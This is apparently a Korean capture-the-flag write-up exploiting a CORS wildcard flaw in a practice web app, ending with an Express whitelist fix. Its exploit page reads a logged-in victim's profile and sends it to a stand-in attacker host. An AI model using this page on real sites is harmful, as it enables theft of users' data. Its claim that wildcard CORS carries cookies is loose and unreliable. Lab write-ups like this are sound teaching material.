+++
title = "VulnABLE CTF [LUXORA] Write-up: CORS Misconfiguration 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "CORS", "Bronze", "Wildcard", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: CORS Misconfiguration 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Infrastructure Layer (CORS Misconfig)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/cors/bronze`
- **목표**: 프론트엔드와 API 서버가 분리된 환경에서, 타겟 API 서버가 아무 도메인에서나 접근을 허용하는 **CORS Wildcard (`*`)** 설정 오류를 범하고 있음을 확인하고, 악성 스크립트를 작성하여 사용자(관리자)의 민감한 정보를 훔쳐라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/cors/bronze/api/profile` 경로에 일반 사용자로 접근하면 자신의 이메일과 권한 등급, 그리고 민감한 토큰이 보입니다.
이 API가 다른 도메인(해커 사이트)의 자바스크립트에서도 읽히는지 확인하기 위해 브라우저 개발자 도구(Console)나 `curl` 을 사용해 응답 헤더를 확인합니다.

**[CORS 설정 확인 (cURL)]**
```bash
$ curl -i -H "Origin: http://evil-attacker.com" http://localhost:3000/cors/bronze/api/profile
```

**[서버의 응답 헤더]**
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true (또는 인증 없이 토큰을 URL로 받는 구조)
Content-Type: application/json

{"username": "user", "secret_token": "token_abc123"}
```

**[해커의 사고 과정]**
1. 이 API 서버는 `Access-Control-Allow-Origin: *` 헤더를 뱉고 있다.
2. `*` (와일드카드)는 "전 세계 모든 웹사이트(도메인)가 내 API에 자바스크립트로 요청을 보내고, 그 결과를 읽어갈 수 있다"는 뜻이다.
3. 이 취약점을 이용하면, 피해자가 내 사이트(`evil-attacker.com`)에 접속했을 때 내가 몰래 자바스크립트를 실행시켜 럭소라 서버의 개인정보를 빼올 수 있겠다!

---

## 💥 2. 취약점 식별 및 악성 스크립트 작성 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Victim's Browser ]
|-- Visits Attacker.com
|-- AJAX Request to Target.com --(with Cookies)--> [ Target.com API ]
                                                   |-- Allows * Origin
<-- Sensitive Data Returned -----------------------|
|-- Exfiltrates Data to Attacker
```


이 취약점은 가장 초보적인 **Cross-Origin Resource Sharing (CORS)** 설정 오류입니다. 

### 💡 악성 HTML(Exploit) 설계
해커 서버에 다음과 같은 HTML 코드를 작성하여 호스팅합니다.

```html
<!DOCTYPE html>
<html>
<head>
    <title>Free Luxury Items!</title>
</head>
<body>
    <h1>Loading your prize...</h1>
    
    <script>
        // 타겟 API로 비동기 GET 요청 전송 (CORS 설정이 * 이므로 브라우저가 차단하지 않음)
        fetch("http://localhost:3000/cors/bronze/api/profile")
            .then(response => response.text())
            .then(data => {
                // 1. 타겟 서버에서 피해자의 데이터를 성공적으로 읽어옴
                console.log("Stolen Data:", data);
                
                // 2. 읽어온 데이터를 해커 서버로 전송(Exfiltration)
                fetch("http://evil-attacker.com/log?data=" + btoa(data));
            })
            .catch(err => console.error("Error:", err));
    </script>
</body>
</html>
```

---

## 🚀 3. 공격 수행 및 정보 탈취

### Step 1. 링크 전송 및 희생자 유도
이 악성 페이지의 링크를 타겟(Admin Bot)에게 보냅니다. 타겟은 현재 럭소라 사이트에 로그인된 상태입니다.

### Step 2. 브라우저 내부 동작 흐름
1. 타겟이 `http://evil-attacker.com/exploit.html` 에 접속합니다.
2. 브라우저는 해커의 스크립트 지시에 따라 `http://localhost:3000/cors...` 로 백그라운드 요청(Fetch)을 보냅니다.
3. 서버는 응답에 `Access-Control-Allow-Origin: *` 를 달아 보냅니다.
4. 브라우저의 **동일 출처 정책(SOP)**은 이 헤더를 보고 "아, 이 서버는 모든 도메인과 데이터를 공유하기로 허락했구나" 라고 판단하여, 해커의 자바스크립트가 응답(데이터)을 읽을 수 있도록 허용합니다.

### 🔍 해커 서버 로그 확인
해커의 웹 서버에 타겟의 민감한 프로필 정보가 Base64로 인코딩되어 들어옵니다.

```text
[GET Request Received]
URI: /log?data=eyJuYW1lIjoiYWRtaW4iLCJmbGFnIjoiRkxBR3tDT1JTX+KOh19XSUxEQ0FSRF9BMEIyQzN9In0=
```

디코딩 해보면 플래그가 들어있습니다.
```json
{"name":"admin", "flag":"FLAG{CORS_🥉_WILDCARD_A0B2C3}"}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

API 서버가 자원(Resource)을 외부로 개방할 때 모든 도메인(`*`)을 신뢰하도록 설정하는 것이 얼마나 위험한 정보 유출(Data Exfiltration) 통로를 만들어내는지 확인했습니다.

**🔥 획득한 플래그:**
`FLAG{CORS_🥉_WILDCARD_A0B2C3}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
개발 편의를 위해(특히 프론트엔드 로컬 개발 시 CORS 에러를 피하려고) 무심코 와일드카드(`*`)를 설정해 두고 운영(Production) 환경에 그대로 배포한 것이 원인입니다.

* **안전한 패치 가이드 (엄격한 Origin 화이트리스트)**
운영 환경에서는 절대 `Access-Control-Allow-Origin: *` 을 사용하면 안 됩니다. 오직 자사의 신뢰할 수 있는 프론트엔드 도메인만 명시적으로 허용해야 합니다.

```javascript
// Node.js (Express / cors 미들웨어) 예시
const cors = require('cors');

const corsOptions = {
    origin: function (origin, callback) {
        const allowedOrigins = ['https://www.luxora.test', 'https://app.luxora.test'];
        
        // origin이 화이트리스트에 있거나, 서버 간 통신(origin이 없는 경우)만 허용
        if (!origin || allowedOrigins.indexOf(origin) !== -1) {
            callback(null, true);
        } else {
            callback(new Error('Not allowed by CORS'));
        }
    },
    credentials: true // 인증 쿠키를 허용하려면 origin이 '*' 일 수 없음
};

app.use(cors(corsOptions));